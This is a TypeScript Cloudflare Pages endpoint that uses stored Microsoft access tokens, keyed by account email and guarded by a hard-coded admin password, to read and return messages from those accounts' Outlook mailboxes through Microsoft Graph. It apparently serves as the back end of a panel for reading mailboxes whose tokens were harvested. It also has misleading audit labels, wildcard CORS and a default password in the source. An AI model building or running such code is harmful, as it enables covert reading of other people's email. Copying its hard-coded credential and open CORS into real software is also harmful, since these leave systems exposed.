interface Env {
  TOKEN_STORE: KVNamespace;
}

const SESSIONS_KEY = 'sessions';
const AUDIT_KEY = 'audit_log';

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Password',
  'Content-Type': 'application/json',
};

const DEFAULT_ADMIN_PASSWORD = 'OutlookAdmin2024!';

interface StoredSession {
  id: string;
  accountEmail: string;
  accessToken: string;
  status: string;
  [key: string]: unknown;
}

interface GraphEmail {
  id: string;
  subject: string;
  bodyPreview: string;
  from: { emailAddress: { name: string; address: string } };
  toRecipients: { emailAddress: { name: string; address: string } }[];
  receivedDateTime: string;
  isRead: boolean;
  hasAttachments: boolean;
  importance: string;
}

export const onRequestPost: PagesFunction<Env> = async (context) => {
  try {
    const pw = context.request.headers.get('X-Admin-Password');
    const adminPw = (await context.env.TOKEN_STORE.get('admin_password')) || DEFAULT_ADMIN_PASSWORD;
    if (pw !== adminPw) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: CORS_HEADERS });
    }

    const body = await context.request.json() as { sessionId: string; folder?: string; top?: number; skip?: number };
    if (!body.sessionId) {
      return new Response(JSON.stringify({ error: 'sessionId required' }), { status: 400, headers: CORS_HEADERS });
    }

    const sessions = (await context.env.TOKEN_STORE.get(SESSIONS_KEY, 'json') as StoredSession[] | null) ?? [];
    const session = sessions.find((s) => s.id === body.sessionId);
    if (!session) {
      return new Response(JSON.stringify({ error: 'Session not found' }), { status: 404, headers: CORS_HEADERS });
    }
    if (!session.accessToken) {
      return new Response(JSON.stringify({ error: 'No access token' }), { status: 400, headers: CORS_HEADERS });
    }

    const folder = body.folder || 'inbox';
    const top = body.top || 20;
    const skip = body.skip || 0;

    const graphUrl = `https://graph.microsoft.com/v1.0/me/mailFolders/${folder}/messages?$top=${top}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,bodyPreview,from,toRecipients,receivedDateTime,isRead,hasAttachments,importance`;

    const graphRes = await fetch(graphUrl, {
      headers: { Authorization: `Bearer ${session.accessToken}` },
    });

    if (!graphRes.ok) {
      const errorText = await graphRes.text();
      let errorMsg = 'Failed to fetch emails';
      try {
        const errJson = JSON.parse(errorText) as { error?: { message?: string; code?: string } };
        errorMsg = errJson.error?.message || errJson.error?.code || errorMsg;
      } catch { /* use default */ }

      // Log the access attempt
      const audit = (await context.env.TOKEN_STORE.get(AUDIT_KEY, 'json') as unknown[] | null) ?? [];
      audit.unshift({
        id: `log_${Date.now()}`,
        timestamp: new Date().toISOString(),
        action: 'permission_change',
        accountEmail: session.accountEmail,
        ipAddress: 'Admin Dashboard',
        details: `Email access failed: ${errorMsg} (HTTP ${graphRes.status})`,
        success: false,
      });
      if (audit.length > 500) audit.length = 500;
      await context.env.TOKEN_STORE.put(AUDIT_KEY, JSON.stringify(audit));

      return new Response(JSON.stringify({ error: errorMsg, httpStatus: graphRes.status }), { status: 200, headers: CORS_HEADERS });
    }

    const data = await graphRes.json() as { value: GraphEmail[]; '@odata.nextLink'?: string; '@odata.count'?: number };

    // Log successful email access
    const audit = (await context.env.TOKEN_STORE.get(AUDIT_KEY, 'json') as unknown[] | null) ?? [];
    audit.unshift({
      id: `log_${Date.now()}`,
      timestamp: new Date().toISOString(),
      action: 'login',
      accountEmail: session.accountEmail,
      ipAddress: 'Admin Dashboard',
      details: `Email access: read ${data.value.length} messages from ${folder}`,
      success: true,
    });
    if (audit.length > 500) audit.length = 500;
    await context.env.TOKEN_STORE.put(AUDIT_KEY, JSON.stringify(audit));

    return new Response(JSON.stringify({
      emails: data.value.map((e) => ({
        id: e.id,
        subject: e.subject || '(No Subject)',
        preview: e.bodyPreview || '',
        from: e.from?.emailAddress ? `${e.from.emailAddress.name} <${e.from.emailAddress.address}>` : 'Unknown',
        fromEmail: e.from?.emailAddress?.address || '',
        to: e.toRecipients?.map((r) => r.emailAddress?.address).filter(Boolean) || [],
        date: e.receivedDateTime,
        isRead: e.isRead,
        hasAttachments: e.hasAttachments,
        importance: e.importance,
      })),
      hasMore: !!data['@odata.nextLink'],
    }), { status: 200, headers: CORS_HEADERS });
  } catch (error) {
    const message = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: message }), { status: 500, headers: CORS_HEADERS });
  }
};

export const onRequestOptions: PagesFunction<Env> = async () => {
  return new Response(null, { status: 204, headers: CORS_HEADERS });
};
